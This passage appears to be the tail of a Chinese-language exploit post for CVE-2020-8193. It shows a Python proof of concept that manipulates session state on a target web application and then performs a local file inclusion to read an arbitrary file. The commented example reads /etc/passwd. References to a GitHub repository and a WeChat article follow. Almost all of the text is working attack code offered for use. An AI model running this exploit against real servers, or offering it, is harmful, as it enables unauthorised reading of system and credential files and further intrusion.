			if r.status_code == 406 and "Content-Disposition" in response_str and r.headers["Accept-Ranges"] == "bytes" and r.headers["Pragma"] == "private":
				print ("_"*80,"\n\n")
				print (r.text)
				print ("_"*80)
			# pass
	else:
		print ("[+] Error!")

def main(base_url):
	print ('[-] Creating session..')
	session = requests.Session()
	create_session(base_url, session)
	print ('[+] Got session: {0}'.format(session.cookies.get_dict()['SESSID']))

	print('[-] Fixing session..')
	fix_session(base_url, session)

	print ('[-] Getting rand..')
	rand = get_rand(base_url, session)
	print ('[+] Got rand: {0}'.format(rand))

	print ('[-] Re-breaking session..')
	create_session(base_url, session)

	print ('[-] Getting file..')
	do_lfi(base_url, session, rand)

if __name__ == '__main__':
	# Slashes need to be urlencoded
	base_url = sys.argv[1]
	if base_url[-1] == '/':
		base_url = base_url[:-1]
	else:
		base_url = base_url
	# PAYLOAD='%2fetc%2fpasswd'
	PAYLOAD = quote(input("[+] Set File= "),"utf-8")
	main(base_url)
```
## 参考 

```
https://github.com/jas502n/CVE-2020-8193
https://mp.weixin.qq.com/s/R9BnOxxK-VWHM7gtsk-LzA
```

